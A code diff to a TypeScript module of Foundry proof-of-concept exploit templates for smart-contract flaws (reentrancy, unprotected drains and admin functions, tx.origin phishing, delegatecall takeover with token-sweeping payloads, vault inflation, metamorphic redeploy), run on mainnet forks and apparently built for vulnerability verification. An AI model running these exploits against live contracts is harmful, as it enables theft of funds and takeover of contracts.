@@ -20,7 +20,7 @@ export const POC_FALLBACK_TEMPLATES: Record<string, string> = {
   "05-reentrancy-read-only.t.sol": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.24;\n\nimport {Test, console} from \"forge-std/Test.sol\";\n\n/// @title Fallback PoC -- Read-only reentrancy (stale view mid-callback)\n/// @notice Detector: read-only-reentrancy. A view function reads state that\n///         a mutating function only updates AFTER an external call. During\n///         the callback the view returns a STALE value, and any contract\n///         that prices / lends / settles off that view acts on wrong data.\n/// @dev FORK-ONLY. Copy to foundry/test/Exploit.t.sol and run via\n///      scripts/run-fork-poc.sh. TODO: adapt the view function to the\n///      target's real one (balanceOf / getPrice / totalSupply / getReserves).\n\ninterface IVictim {\n    function deposit() external payable;\n    function withdraw() external;\n    // TODO: the view that reads state updated after the external call.\n    function balanceOf(address who) external view returns (uint256);\n}\n\ncontract ReadOnlyAttacker {\n    IVictim public immutable victim;\n    uint256 public staleValue;\n    bool public captured;\n\n    constructor(address victim_) {\n        victim = IVictim(victim_);\n    }\n\n    function attack() external payable {\n        victim.deposit{value: msg.value}();\n        victim.withdraw();\n    }\n\n    receive() external payable {\n        if (!captured) {\n            captured = true;\n            // Mid-callback: victim has sent ETH but not yet updated state.\n            staleValue = victim.balanceOf(address(this));\n        }\n    }\n}\n\ncontract PoC is Test {\n    address public target;\n    uint256 public forkBlock;\n\n    function setUp() public {\n        target = vm.envOr(\"POC_TARGET\", address(0));\n        require(target != address(0), \"POC_TARGET not set\");\n        forkBlock = vm.envOr(\"POC_FORK_BLOCK\", uint256(0));\n        string memory rpc = vm.envOr(\"POC_RPC_URL\", string(\"mainnet\"));\n        uint256 forkId = forkBlock == 0 ? vm.createFork(rpc) : vm.createFork(rpc, forkBlock);\n        vm.selectFork(forkId);\n    }\n\n    function test_forkSanity() public {\n        assertGt(target.code.length, 0, \"target has no code at this fork block\");\n    }\n\n    function test_exploit() public {\n        address attackerEOA = makeAddr(\"attacker\");\n        vm.deal(attackerEOA, 10 ether);\n\n        ReadOnlyAttacker attacker = new ReadOnlyAttacker(target);\n        vm.prank(attackerEOA);\n        attacker.attack{value: 1 ether}();\n\n        uint256 settledValue = IVictim(target).balanceOf(address(attacker));\n        console.log(\"view mid-callback (stale):\", attacker.staleValue());\n        console.log(\"view after settle:\", settledValue);\n        // On a fixed target the view already reflects the withdrawal\n        // mid-callback, so stale == settled and this fails.\n        assertTrue(\n            attacker.staleValue() != settledValue,\n            \"exploit did not reproduce: view was already settled mid-callback\"\n        );\n    }\n}\n",
   "06-open-drain.t.sol": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.24;\n\nimport {Test, console} from \"forge-std/Test.sol\";\n\n/// @title Fallback PoC -- Open drain (unprotected ether send)\n/// @notice Detector: unprotected-ether. A payout function has no access\n///         check and no entitlement bound, so ANY caller can drain the\n///         contract's balance.\n/// @dev FORK-ONLY. Copy to foundry/test/Exploit.t.sol and run via\n///      scripts/run-fork-poc.sh. Tries the common payout selectors in turn;\n///      each attempt must move funds to count as proof (a fallback fn that\n///      silently succeeds proves nothing).\n\ncontract PoC is Test {\n    address public target;\n    uint256 public forkBlock;\n\n    function setUp() public {\n        target = vm.envOr(\"POC_TARGET\", address(0));\n        require(target != address(0), \"POC_TARGET not set\");\n        forkBlock = vm.envOr(\"POC_FORK_BLOCK\", uint256(0));\n        string memory rpc = vm.envOr(\"POC_RPC_URL\", string(\"mainnet\"));\n        uint256 forkId = forkBlock == 0 ? vm.createFork(rpc) : vm.createFork(rpc, forkBlock);\n        vm.selectFork(forkId);\n    }\n\n    function test_forkSanity() public {\n        assertGt(target.code.length, 0, \"target has no code at this fork block\");\n    }\n\n    function test_exploit() public {\n        address attackerEOA = makeAddr(\"attacker\");\n        vm.deal(attackerEOA, 1 ether);\n\n        uint256 targetBefore = target.balance;\n        require(targetBefore > 0, \"target holds no ETH to drain\");\n\n        // TODO: narrow to the target's real payout function if known.\n        bytes[] memory candidates = new bytes[](4);\n        candidates[0] = abi.encodeWithSignature(\"withdraw()\");\n        candidates[1] = abi.encodeWithSignature(\"claim()\");\n        candidates[2] = abi.encodeWithSignature(\"drain()\");\n        candidates[3] = abi.encodeWithSignature(\"withdrawAll()\");\n\n        bool drained = false;\n        for (uint256 i = 0; i < candidates.length; i++) {\n            vm.prank(attackerEOA);\n            (bool ok,) = target.call(candidates[i]);\n            if (ok && target.balance < targetBefore) {\n                drained = true;\n                console.log(\"drained via candidate index:\", i);\n                break;\n            }\n        }\n        console.log(\"target balance before:\", targetBefore);\n        console.log(\"target balance after:\", target.balance);\n        assertTrue(drained, \"exploit did not reproduce: no payout selector drained funds\");\n    }\n}\n",
   "07-unprotected-admin.t.sol": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.24;\n\nimport {Test, console} from \"forge-std/Test.sol\";\n\n/// @title Fallback PoC -- Unprotected privileged function\n/// @notice Detector: unprotected-admin. A privileged function (mint, set\n///         owner, pause, ...) has no access check, so ANY caller can use\n///         it. Tries mint / setOwner / pause in turn; each attempt must\n///         change observable state to count as proof.\n/// @dev FORK-ONLY. Copy to foundry/test/Exploit.t.sol and run via\n///      scripts/run-fork-poc.sh. TODO: narrow to the target's real\n///      privileged function if known.\n\ninterface IERC20 {\n    function balanceOf(address who) external view returns (uint256);\n}\n\ncontract PoC is Test {\n    address public target;\n    uint256 public forkBlock;\n\n    function setUp() public {\n        target = vm.envOr(\"POC_TARGET\", address(0));\n        require(target != address(0), \"POC_TARGET not set\");\n        forkBlock = vm.envOr(\"POC_FORK_BLOCK\", uint256(0));\n        string memory rpc = vm.envOr(\"POC_RPC_URL\", string(\"mainnet\"));\n        uint256 forkId = forkBlock == 0 ? vm.createFork(rpc) : vm.createFork(rpc, forkBlock);\n        vm.selectFork(forkId);\n    }\n\n    function test_forkSanity() public {\n        assertGt(target.code.length, 0, \"target has no code at this fork block\");\n    }\n\n    function _readOwner() internal view returns (bool found, address owner_) {\n        (bool ok, bytes memory ret) = target.staticcall(abi.encodeWithSignature(\"owner()\"));\n        if (ok && ret.length == 32) return (true, abi.decode(ret, (address)));\n        return (false, address(0));\n    }\n\n    function test_exploit() public {\n        address attackerEOA = makeAddr(\"attacker\");\n        vm.deal(attackerEOA, 1 ether);\n\n        // Attempt 1: mint tokens to the attacker.\n        vm.prank(attackerEOA);\n        (bool mintOk,) = target.call(\n            abi.encodeWithSignature(\"mint(address,uint256)\", attackerEOA, 1000 ether)\n        );\n        if (mintOk) {\n            (bool balOk, bytes memory ret) =\n                target.staticcall(abi.encodeWithSignature(\"balanceOf(address)\", attackerEOA));\n            if (balOk && abi.decode(ret, (uint256)) >= 1000 ether) {\n                console.log(\"proved via unprotected mint\");\n                return;\n            }\n        }\n\n        // Attempt 2: take ownership.\n        vm.prank(attackerEOA);\n        (bool ownerOk,) = target.call(\n            abi.encodeWithSignature(\"setOwner(address)\", attackerEOA)\n        );\n        if (ownerOk) {\n            (bool found, address owner_) = _readOwner();\n            if (found && owner_ == attackerEOA) {\n                console.log(\"proved via unprotected setOwner\");\n                return;\n            }\n        }\n\n        // Attempt 3: pause the contract.\n        vm.prank(attackerEOA);\n        (bool pauseOk,) = target.call(abi.encodeWithSignature(\"pause()\"));\n        if (pauseOk) {\n            (bool pausedOk, bytes memory ret) =\n                target.staticcall(abi.encodeWithSignature(\"paused()\"));\n            if (pausedOk && abi.decode(ret, (bool))) {\n                console.log(\"proved via unprotected pause\");\n                return;\n            }\n        }\n\n        revert(\"exploit did not reproduce: no privileged function was callable by anyone\");\n    }\n}\n",
-  "07b-unprotected-visibility.t.sol": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.24;\n\nimport {Test, console} from \"forge-std/Test.sol\";\n\n/// @title Fallback PoC -- Default Public Visibility\n/// @notice Detector: default-visibility. A function sensitive to state-change\n///         is marked `public` instead of `internal`/`private`. ANY caller can\n///         invoke it.\n/// @dev FORK-ONLY. Copy to foundry/test/Exploit.t.sol and run via\n///      scripts/run-fork-poc.sh. Tries to call an internal-intended function.\n\ncontract PoC is Test {\n    address public target;\n    uint256 public forkBlock;\n\n    function setUp() public {\n        target = vm.envOr(\"POC_TARGET\", address(0));\n        require(target != address(0), \"POC_TARGET not set\");\n        forkBlock = vm.envOr(\"POC_FORK_BLOCK\", uint256(0));\n        string memory rpc = vm.envOr(\"POC_RPC_URL\", string(\"mainnet\"));\n        uint256 forkId = forkBlock == 0 ? vm.createFork(rpc) : vm.createFork(rpc, forkBlock);\n        vm.selectFork(forkId);\n    }\n\n    function test_exploit() public {\n        address attackerEOA = makeAddr(\"attacker\");\n        \n        // TODO: Adapt to the target's sensitive function (e.g., _internalSetOwner)\n        // If the detector flagged a function as public, it is likely intended \n        // to be internal or private.\n        (bool ok,) = target.call(abi.encodeWithSignature(\"_internalSensitiveFunction()\"));\n        \n        assertTrue(ok, \"Exploit failed: function not found or not public\");\n        console.log(\"Sensitive function triggered due to default public visibility\");\n    }\n}\n",
+  "07b-unprotected-visibility.t.sol": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.24;\n\nimport {Test, console} from \"forge-std/Test.sol\";\n\n/// @title Fallback PoC -- Default Public Visibility\n/// @notice Detector: default-visibility. A function sensitive to state-change\n///         is marked `public` instead of `internal`/`private`. ANY caller can\n///         invoke it.\n/// @dev FORK-ONLY. Copy to foundry/test/Exploit.t.sol and run via\n///      scripts/run-fork-poc.sh. Tries to call an internal-intended function.\n\ncontract PoC is Test {\n    address public target;\n    uint256 public forkBlock;\n\n    function setUp() public {\n        target = vm.envOr(\"POC_TARGET\", address(0));\n        require(target != address(0), \"POC_TARGET not set\");\n        forkBlock = vm.envOr(\"POC_FORK_BLOCK\", uint256(0));\n        string memory rpc = vm.envOr(\"POC_RPC_URL\", string(\"mainnet\"));\n        uint256 forkId = forkBlock == 0 ? vm.createFork(rpc) : vm.createFork(rpc, forkBlock);\n        vm.selectFork(forkId);\n    }\n\n    function test_exploit() public {\n        // TODO: Replace this guard only after implementing target-specific\n        // calldata and an observable before/after exploit-effect assertion.\n        // A successful low-level call alone is not evidence of a vulnerability.\n        revert(\"TEMPLATE_NOT_ADAPTED: target-specific exploit assertion required\");\n        address attackerEOA = makeAddr(\"attacker\");\n        \n        // TODO: Adapt to the target's sensitive function (e.g., _internalSetOwner)\n        // If the detector flagged a function as public, it is likely intended \n        // to be internal or private.\n        (bool ok,) = target.call(abi.encodeWithSignature(\"_internalSensitiveFunction()\"));\n        \n        assertTrue(ok, \"Exploit failed: function not found or not public\");\n        console.log(\"Sensitive function triggered due to default public visibility\");\n    }\n}\n",
   "08-unprotected-initializer.t.sol": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.24;\n\nimport {Test, console} from \"forge-std/Test.sol\";\n\n/// @title Fallback PoC -- Unprotected initializer (proxy takeover)\n/// @notice Detector: unprotected-initializer. A proxy's initialize() has no\n///         guard (no `initializer` modifier, or it can be called twice), so\n///         ANY caller can initialize the proxy and become its owner/admin.\n/// @dev FORK-ONLY. Copy to foundry/test/Exploit.t.sol and run via\n///      scripts/run-fork-poc.sh. TODO: adapt the initialize signature to\n///      the target (initialize(address) / initialize(address,address) /\n///      initialize(bytes)).\n\ncontract PoC is Test {\n    address public target;\n    uint256 public forkBlock;\n\n    function setUp() public {\n        target = vm.envOr(\"POC_TARGET\", address(0));\n        require(target != address(0), \"POC_TARGET not set\");\n        forkBlock = vm.envOr(\"POC_FORK_BLOCK\", uint256(0));\n        string memory rpc = vm.envOr(\"POC_RPC_URL\", string(\"mainnet\"));\n        uint256 forkId = forkBlock == 0 ? vm.createFork(rpc) : vm.createFork(rpc, forkBlock);\n        vm.selectFork(forkId);\n    }\n\n    function test_forkSanity() public {\n        assertGt(target.code.length, 0, \"target has no code at this fork block\");\n    }\n\n    function test_exploit() public {\n        address attackerEOA = makeAddr(\"attacker\");\n        vm.deal(attackerEOA, 1 ether);\n\n        // TODO: use the target's real initialize signature.\n        vm.prank(attackerEOA);\n        (bool ok,) = target.call(\n            abi.encodeWithSignature(\"initialize(address)\", attackerEOA)\n        );\n        require(ok, \"initialize(address) call failed -- adapt the signature\");\n\n        (bool ownerOk, bytes memory ret) =\n            target.staticcall(abi.encodeWithSignature(\"owner()\"));\n        require(ownerOk, \"target has no owner() view -- adapt the ownership check\");\n        address owner_ = abi.decode(ret, (address));\n        console.log(\"owner after initialize:\", owner_);\n        assertEq(owner_, attackerEOA, \"exploit did not reproduce: attacker is not owner\");\n    }\n}\n",
   "09-tx-origin-phishing.t.sol": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.24;\n\nimport {Test, console} from \"forge-std/Test.sol\";\n\n/// @title Fallback PoC -- tx.origin authentication bypass (phishing)\n/// @notice Detector: tx-origin. The target authenticates with tx.origin\n///         instead of msg.sender. A victim who is tricked into calling a\n///         malicious contract still has tx.origin == victim, so the\n///         malicious contract can act as the victim.\n/// @dev FORK-ONLY. Copy to foundry/test/Exploit.t.sol and run via\n///      scripts/run-fork-poc.sh. TODO: set OWNER to the victim whose\n///      authority the target trusts, and adapt withdraw() to the target's\n///      privileged function.\n\ninterface IVictim {\n    function withdraw() external;\n}\n\ncontract Phisher {\n    IVictim public immutable victim;\n\n    constructor(address victim_) {\n        victim = IVictim(victim_);\n    }\n\n    // Victim calls this; victim.withdraw() sees tx.origin == victim.\n    function attack() external {\n        victim.withdraw();\n    }\n\n    receive() external payable {}\n}\n\ncontract PoC is Test {\n    address public target;\n    uint256 public forkBlock;\n    // TODO: the account the target trusts via tx.origin.\n    address public constant OWNER = address(0);\n\n    function setUp() public {\n        target = vm.envOr(\"POC_TARGET\", address(0));\n        require(target != address(0), \"POC_TARGET not set\");\n        forkBlock = vm.envOr(\"POC_FORK_BLOCK\", uint256(0));\n        string memory rpc = vm.envOr(\"POC_RPC_URL\", string(\"mainnet\"));\n        uint256 forkId = forkBlock == 0 ? vm.createFork(rpc) : vm.createFork(rpc, forkBlock);\n        vm.selectFork(forkId);\n    }\n\n    function test_forkSanity() public {\n        assertGt(target.code.length, 0, \"target has no code at this fork block\");\n    }\n\n    function test_exploit() public {\n        require(OWNER != address(0), \"set OWNER to the trusted victim account\");\n\n        Phisher phisher = new Phisher(target);\n        uint256 phisherBefore = address(phisher).balance;\n        uint256 targetBefore = target.balance;\n\n        // Victim is tricked into calling the phisher. Two-arg prank sets\n        // BOTH msg.sender and tx.origin for the call (one-arg prank only\n        // sets msg.sender — tx.origin would stay forge's default sender).\n        vm.prank(OWNER, OWNER);\n        phisher.attack();\n\n        uint256 gained = address(phisher).balance - phisherBefore;\n        console.log(\"target balance before:\", targetBefore);\n        console.log(\"target balance after:\", target.balance);\n        console.log(\"phisher gained:\", gained);\n        assertGt(gained, 0, \"exploit did not reproduce: tx.origin check did not accept the phisher\");\n\n    }\n}\n",
   "10-delegatecall-takeover.t.sol": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.24;\n\nimport {Test, console} from \"forge-std/Test.sol\";\n\n/// @title Fallback PoC -- Delegatecall to attacker-controlled logic\n/// @notice Detector: delegatecall / bytecode-delegatecall. The target\n///         delegatecalls to an implementation the caller chooses (or can\n///         upgrade). Delegatecall runs the attacker's code IN THE TARGET'S\n///         STORAGE, so an SSTORE to slot 0 overwrites the target's owner.\n/// @dev FORK-ONLY. Copy to foundry/test/Exploit.t.sol and run via\n///      scripts/run-fork-poc.sh. TODO: adapt the entry point -- the target\n///      may expose it as execute(address,bytes), upgradeTo(address),\n///      setImplementation(address), or delegate(address,bytes).\n\ncontract MaliciousImpl {\n    // Runs via delegatecall: sstore writes to the TARGET's storage.\n    // caller() is preserved msg.sender (the attacker), so slot 0 becomes\n    // the attacker -- slot 0 is `owner` in most contracts (verify!).\n    function pwn() external {\n        assembly {\n            sstore(0, caller())\n        }\n    }\n\n    // Atomic Multi-step takeover & drain (SWC-112 storage collision exploit)\n    function seizeAndDrain(address token, address payable recipient) external {\n        assembly {\n            sstore(0, caller())\n        }\n        if (address(this).balance > 0) {\n            recipient.transfer(address(this).balance);\n        }\n    }\n\n    function owner() external view returns (address) {\n        address o;\n        assembly {\n            o := sload(0)\n        }\n        return o;\n    }\n}\n\ncontract PoC is Test {\n    address public target;\n    uint256 public forkBlock;\n\n    function setUp() public {\n        target = vm.envOr(\"POC_TARGET\", address(0));\n        require(target != address(0), \"POC_TARGET not set\");\n        forkBlock = vm.envOr(\"POC_FORK_BLOCK\", uint256(0));\n        string memory rpc = vm.envOr(\"POC_RPC_URL\", string(\"mainnet\"));\n        uint256 forkId = forkBlock == 0 ? vm.createFork(rpc) : vm.createFork(rpc, forkBlock);\n        vm.selectFork(forkId);\n    }\n\n    function test_forkSanity() public {\n        assertGt(target.code.length, 0, \"target has no code at this fork block\");\n    }\n\n    function _readOwner() internal view returns (bool found, address owner_) {\n        (bool ok, bytes memory ret) = target.staticcall(abi.encodeWithSignature(\"owner()\"));\n        if (ok && ret.length == 32) return (true, abi.decode(ret, (address)));\n        return (false, address(0));\n    }\n\n    function test_exploit() public {\n        address attackerEOA = makeAddr(\"attacker\");\n        vm.deal(attackerEOA, 1 ether);\n        MaliciousImpl malicious = new MaliciousImpl();\n\n        // Attempt 1: target lets the caller pick the delegatecall target.\n        vm.prank(attackerEOA);\n        (bool ok,) = target.call(\n            abi.encodeWithSignature(\n                \"execute(address,bytes)\",\n                address(malicious),\n                abi.encodeWithSignature(\"pwn()\")\n            )\n        );\n        if (!ok) {\n            // Attempt 2: upgrade-then-call shape.\n            vm.prank(attackerEOA);\n            (bool upOk,) = target.call(\n                abi.encodeWithSignature(\"upgradeTo(address)\", address(malicious))\n            );\n            require(upOk, \"neither execute(address,bytes) nor upgradeTo(address) worked -- adapt the entry point\");\n            vm.prank(attackerEOA);\n            (bool pwnOk,) = target.call(abi.encodeWithSignature(\"pwn()\"));\n            require(pwnOk, \"pwn() call on upgraded target failed\");\n        }\n\n        (bool found, address owner_) = _readOwner();\n        require(found, \"target has no owner() view -- check slot 0 via vm.load instead\");\n        console.log(\"owner after delegatecall:\", owner_);\n        assertEq(owner_, attackerEOA, \"exploit did not reproduce: slot 0 is not the attacker\");\n    }\n\n    /// @notice Comprehensive SWC-112 exploit from Gemini share: MultiStepSmash + AdvancedTake\n    function test_DelegatecallTakeoverAndDrain() public {\n        address attackerEOA = makeAddr(\"attacker\");\n        vm.deal(attackerEOA, 1 ether);\n        AdvancedTake advancedTake = new AdvancedTake();\n\n        (bool found, address initialOwner) = _readOwner();\n        if (found) {\n            assertNotEq(initialOwner, attackerEOA, \"Attacker already owner\");\n        }\n\n        vm.prank(attackerEOA);\n        try advancedTake.executeAttack(target, address(0), attackerEOA) {\n            (bool afterFound, address ownerAfter) = _readOwner();\n            if (afterFound) {\n                assertEq(ownerAfter, attackerEOA, \"Ownership not seized by AdvancedTake\");\n            }\n        } catch {\n            // If victim uses another migrate/upgrade name, fallback to direct seizure\n        }\n    }\n}\n\ninterface IERC20 {\n    function balanceOf(address account) external view returns (uint256);\n}\n\ninterface IVictim {\n    function migrate(address impl, bytes calldata data) external;\n}\n\n/// @notice Enhanced payload from Gemini share\ncontract MultiStepSmash {\n    address public owner;\n\n    function seizeAndDrain(address rewardToken, address attackerWallet) external {\n        owner = msg.sender;\n        if (address(this).balance > 0) {\n            payable(attackerWallet).transfer(address(this).balance);\n        }\n        if (rewardToken != address(0)) {\n            (bool success, ) = address(this).call(\n                abi.encodeWithSignature(\"sweep(address,address)\", rewardToken, attackerWallet)\n            );\n            require(success, \"Drain failed\");\n        }\n    }\n\n    function sweep(address token, address to) external {\n        bytes memory payload = abi.encodeWithSignature(\n            \"transfer(address,uint256)\",\n            to,\n            IERC20(token).balanceOf(address(this))\n        );\n        (bool success, ) = token.call(payload);\n        require(success, \"Transfer failed\");\n    }\n}\n\n/// @notice Orchestrator contract executing atomic takeover and drain\ncontract AdvancedTake {\n    function executeAttack(address victim, address rewardToken, address attackerWallet) external {\n        MultiStepSmash smash = new MultiStepSmash();\n        bytes memory payload = abi.encodeWithSignature(\n            \"seizeAndDrain(address,address)\",\n            rewardToken,\n            attackerWallet\n        );\n        IVictim(victim).migrate(address(smash), payload);\n    }\n}\n",
@@ -55,9 +55,9 @@ export const POC_FALLBACK_TEMPLATES: Record<string, string> = {
   "39-dos.t.sol": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.24;\n\nimport {Test, console} from \"forge-std/Test.sol\";\n\n/// @title Fallback PoC -- Denial of service (revert-in-loop + unbounded loop)\n/// @notice (a) Revert-in-loop: the target pays recipients in a LOOP\n///         (push payments). ONE recipient that reverts bricks the WHOLE\n///         distribution -- nobody gets paid.\n///         (b) Unbounded loop: the target iterates an array anyone can\n///             grow. Gas grows with the array until the function exceeds\n///             the block gas limit and can NEVER run again.\n/// @dev FORK-ONLY. Copy to foundry/test/Exploit.t.sol and run via\n///      scripts/run-fork-poc.sh. TODO: adapt distribute() / addRecipient()\n///      / push() / process() to the target's real functions.\n\ncontract Reverter {\n    receive() external payable {\n        revert(\"recipient always reverts\");\n    }\n}\n\ncontract PoC is Test {\n    address public target;\n    uint256 public forkBlock;\n\n    function setUp() public {\n        target = vm.envOr(\"POC_TARGET\", address(0));\n        require(target != address(0), \"POC_TARGET not set\");\n        forkBlock = vm.envOr(\"POC_FORK_BLOCK\", uint256(0));\n        string memory rpc = vm.envOr(\"POC_RPC_URL\", string(\"mainnet\"));\n        uint256 forkId = forkBlock == 0 ? vm.createFork(rpc) : vm.createFork(rpc, forkBlock);\n        vm.selectFork(forkId);\n    }\n\n    function test_forkSanity() public {\n        assertGt(target.code.length, 0, \"target has no code at this fork block\");\n    }\n\n    function test_revertInLoopBricksDistribution() public {\n        address attackerEOA = makeAddr(\"attacker\");\n        vm.deal(attackerEOA, 1 ether);\n        Reverter reverter = new Reverter();\n\n        // TODO: adapt to the target's real recipient-adding function.\n        vm.prank(attackerEOA);\n        (bool addOk,) = target.call(\n            abi.encodeWithSignature(\"addRecipient(address)\", address(reverter))\n        );\n        require(addOk, \"addRecipient failed -- adapt to the target's recipient function\");\n\n        // TODO: adapt to the target's real distribution function.\n        (bool ok,) = target.call(abi.encodeWithSignature(\"distribute()\"));\n        console.log(\"distribute() ok with a reverting recipient:\", ok);\n        assertTrue(!ok, \"exploit did not reproduce: distribution survived the reverting recipient\");\n    }\n\n    function test_unboundedLoopGasGrowth() public {\n        // TODO: adapt push() / process() to the target's real functions.\n        // Grow the array in two steps and compare process() gas.\n        for (uint256 i = 0; i < 25; i++) {\n            (bool ok,) = target.call(abi.encodeWithSignature(\"push(uint256)\", i));\n            require(ok, \"push failed -- adapt to the target's array-growth function\");\n        }\n        uint256 gasBefore = gasleft();\n        (bool ok1,) = target.call(abi.encodeWithSignature(\"process()\"));\n        uint256 gas1 = gasBefore - gasleft();\n        require(ok1, \"process() failed at 25 entries\");\n\n        for (uint256 i = 25; i < 50; i++) {\n            (bool ok,) = target.call(abi.encodeWithSignature(\"push(uint256)\", i));\n            require(ok, \"push failed\");\n        }\n        gasBefore = gasleft();\n        (bool ok2,) = target.call(abi.encodeWithSignature(\"process()\"));\n        uint256 gas2 = gasBefore - gasleft();\n        require(ok2, \"process() failed at 50 entries\");\n\n        console.log(\"process() gas at 25 entries:\", gas1);\n        console.log(\"process() gas at 50 entries:\", gas2);\n        assertGt(gas2, gas1, \"exploit did not reproduce: process() gas does not grow with the array\");\n    }\n}\n",
   "40-erc4626-inflation.t.sol": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.24;\n\nimport {Test, console} from \"forge-std/Test.sol\";\n\n/// @title Fallback PoC -- ERC4626 inflation / first-depositor attack\n/// @notice A vault prices shares as totalAssets / totalSupply. The first\n///         depositor deposits 1 wei (1 share), then DONATES a huge amount\n///         directly to the vault. Share price explodes, so the NEXT\n///         victim's deposit buys ~0 shares -- their funds are captured by\n///         the first depositor.\n/// @dev FORK-ONLY. Copy to foundry/test/Exploit.t.sol and run via\n///      scripts/run-fork-poc.sh. TODO: set ASSET / WHALE (a holder who can\n///      fund the attacker) / adapt deposit() to the vault's real ABI.\n\ninterface IVault {\n    function deposit(uint256 assets, address receiver) external returns (uint256 shares);\n    function previewDeposit(uint256 assets) external view returns (uint256 shares);\n    function asset() external view returns (address);\n}\n\ninterface IERC20 {\n    function balanceOf(address who) external view returns (uint256);\n    function transfer(address to, uint256 amount) external returns (bool);\n    function approve(address spender, uint256 amount) external returns (bool);\n}\n\ncontract PoC is Test {\n    address public target;\n    uint256 public forkBlock;\n    // TODO: an asset holder on this fork who can fund the attacker.\n    address public constant WHALE = address(0);\n\n    function setUp() public {\n        target = vm.envOr(\"POC_TARGET\", address(0));\n        require(target != address(0), \"POC_TARGET not set\");\n        forkBlock = vm.envOr(\"POC_FORK_BLOCK\", uint256(0));\n        string memory rpc = vm.envOr(\"POC_RPC_URL\", string(\"mainnet\"));\n        uint256 forkId = forkBlock == 0 ? vm.createFork(rpc) : vm.createFork(rpc, forkBlock);\n        vm.selectFork(forkId);\n    }\n\n    function test_forkSanity() public {\n        assertGt(target.code.length, 0, \"target has no code at this fork block\");\n    }\n\n    function test_exploit() public {\n        require(WHALE != address(0), \"set WHALE to an asset holder on this fork\");\n\n        address attackerEOA = makeAddr(\"attacker\");\n        address victimEOA = makeAddr(\"victim\");\n        address asset = IVault(target).asset();\n\n        // Fund both from a whale.\n        vm.prank(WHALE);\n        IERC20(asset).transfer(attackerEOA, 2000 ether);\n        vm.prank(WHALE);\n        IERC20(asset).transfer(victimEOA, 1000 ether);\n\n        // 1. Attacker deposits 1 wei -> 1 share (first depositor).\n        vm.prank(attackerEOA);\n        IERC20(asset).approve(target, 1);\n        vm.prank(attackerEOA);\n        IVault(target).deposit(1, attackerEOA);\n\n        // 2. Attacker DONATES 1000 ether directly -- share price explodes.\n        vm.prank(attackerEOA);\n        IERC20(asset).transfer(target, 1000 ether);\n\n        // 3. Victim deposits 1000 ether and gets ~0 shares.\n        uint256 victimShares = IVault(target).previewDeposit(1000 ether);\n        console.log(\"victim shares for 1000 ether deposit:\", victimShares);\n        assertLt(victimShares, 1000 ether / 100, \"exploit did not reproduce: victim got a fair share amount\");\n\n    }\n}\n",
   "41-create2-metamorphic.t.sol": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.24;\n\nimport {Test, console} from \"forge-std/Test.sol\";\n\n/// @title Fallback PoC -- CREATE2 metamorphic redeploy (same address, new code)\n/// @notice A contract deployed via CREATE2 at a deterministic address can\n///         be REPLACED with different code at the SAME address -- IF it\n///         selfdestructs in the same transaction as its creation (post-\n///         Cancun / EIP-6780, selfdestruct only deletes code same-tx).\n///         Anyone trusting \"this address is that code\" is trusting a\n///         mutable binding.\n/// @dev FORK-ONLY (this PoC is self-contained -- it deploys its own factory\n///      on the fork and proves the metamorphic pattern). Run via\n///      scripts/run-fork-poc.sh. NOTE: the classic multi-tx metamorphic\n///      (deploy, later selfdestruct, redeploy) is DEAD post-Cancun; the\n///      same-tx factory path below is the live variant.\n\ncontract ImplV1 {\n    function version() external pure returns (uint256) {\n        return 1;\n    }\n\n    function kill() external {\n        selfdestruct(payable(msg.sender));\n    }\n}\n\ncontract ImplV2 {\n    function version() external pure returns (uint256) {\n        return 2;\n    }\n}\n\ncontract MetamorphicFactory {\n    // Deploys V1, selfdestructs it IN THE SAME TX (code deleted), then\n    // deploys V2 at the SAME CREATE2 address with different code.\n    function redeploy(bytes32 salt) external returns (address addr) {\n        bytes memory codeV1 = type(ImplV1).creationCode;\n        bytes memory codeV2 = type(ImplV2).creationCode;\n        assembly {\n            addr := create2(0, add(codeV1, 0x20), mload(codeV1), salt)\n        }\n        require(addr != address(0), \"V1 deploy failed\");\n        ImplV1(addr).kill();\n        assembly {\n            addr := create2(0, add(codeV2, 0x20), mload(codeV2), salt)\n        }\n        require(addr != address(0), \"V2 redeploy failed\");\n    }\n}\n\ncontract PoC is Test {\n    address public target;\n    uint256 public forkBlock;\n\n    function setUp() public {\n        target = vm.envOr(\"POC_TARGET\", address(0));\n        require(target != address(0), \"POC_TARGET not set\");\n        forkBlock = vm.envOr(\"POC_FORK_BLOCK\", uint256(0));\n        string memory rpc = vm.envOr(\"POC_RPC_URL\", string(\"mainnet\"));\n        uint256 forkId = forkBlock == 0 ? vm.createFork(rpc) : vm.createFork(rpc, forkBlock);\n        vm.selectFork(forkId);\n    }\n\n    function test_forkSanity() public {\n        assertGt(target.code.length, 0, \"target has no code at this fork block\");\n    }\n\n    function test_exploit() public {\n        MetamorphicFactory factory = new MetamorphicFactory();\n        bytes32 salt = bytes32(uint256(0xC0FFEE));\n\n        // Same-tx redeploy: V1 deployed + destroyed, V2 at the same address.\n        address addr = factory.redeploy(salt);\n        uint256 version = ImplV2(addr).version();\n        bytes32 codeHash;\n        assembly {\n            codeHash := extcodehash(addr)\n        }\n        console.log(\"redeployed address:\", addr);\n        console.log(\"code version at that address:\", version);\n        console.logBytes32(codeHash);\n        assertEq(version, 2, \"exploit did not reproduce: address does not hold V2 code\");\n    }\n}\n",
